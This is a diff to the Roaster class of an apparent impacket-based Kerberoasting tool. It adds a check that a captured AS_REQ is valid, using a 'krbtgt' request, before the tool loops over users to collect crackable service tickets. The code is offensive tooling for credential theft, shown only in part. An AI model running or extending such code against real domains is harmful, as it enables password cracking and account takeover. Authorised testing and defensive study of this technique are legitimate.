@@ -42,21 +42,27 @@ class Roaster:
             logger.debug(f'[bright_cyan bold]--dc-ip[/] not specified, setting DC to {self.__realm}', extra=OBJ_EXTRA_FMT)
 
         logger.info('Starting roaster...')
-        logger.info(f'Attempting to roast {len(self.__users)} users')
 
-        for user in self.__users:
-            if user != '':
-                self._construct_AS_REQ(user)
+        logger.info('Checking if the captured AS_REQ is valid with a request for krbtgt')
+        if self._construct_AS_REQ('krbtgt', output=False):
+            self.as_req_is_valid = True
 
-        if self.__output_file:
-            self.__output_file_handle.close()
-        
-        logger.info(f'Roaster complete! Roasted {self.roasted} accounts')
+            logger.info(f'The AS_REQ is valid! Attempting to roast {len(self.__users)} users')
+            for user in self.__users:
+                if user != '':
+                    _ = self._construct_AS_REQ(user)
 
-    
+            if self.__output_file:
+                self.__output_file_handle.close()
+
+            logger.info(f'Roaster complete! Performed {self.roasted} roast attempts')
+        else:
+            self.as_req_is_valid = False
+
+
     # slightly modified from 
     #   https://github.com/SecureAuthCorp/impacket/blob/master/impacket/krb5/kerberosv5.py#L95
-    def _construct_AS_REQ(self, username):
+    def _construct_AS_REQ(self, username, output=True):
         clientName = Principal(self.__cname, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
         # new raw AS-REQ
@@ -125,10 +131,10 @@ class Roaster:
                 r = sendReceive(message, self.__realm, self.__kdcIP)
             elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_S_PRINCIPAL_UNKNOWN.value:
                 logger.debug(f'Received [red bold]ERR_S_PRINCIPAL_UKNOWN[/] for SPN [blue bold]{username}[/]', extra=OBJ_EXTRA_FMT)
-                return
+                return False
             elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
                 logger.debug(f'Received [red bold]KDC_ERR_PREAUTH_FAILED[/] for SPN [blue bold]{username}[/] (probably invalid password was entered)', extra=OBJ_EXTRA_FMT)
-                return
+                return False
             else:
                 raise e
         except OSError as e:
@@ -140,7 +146,11 @@ class Roaster:
         
         logger.info(f'Roasted SPN [blue bold]{username}[/] :fire:', extra=OBJ_EXTRA_FMT)
         self.roasted += 1
-        self._outputTGS(r, username, username)
+
+        if output:
+            self._outputTGS(r, username, username)
+
+        return True
 
 
     # https://github.com/ShutdownRepo/impacket/blob/getuserspns-nopreauth/examples/GetUserSPNs.py#L178
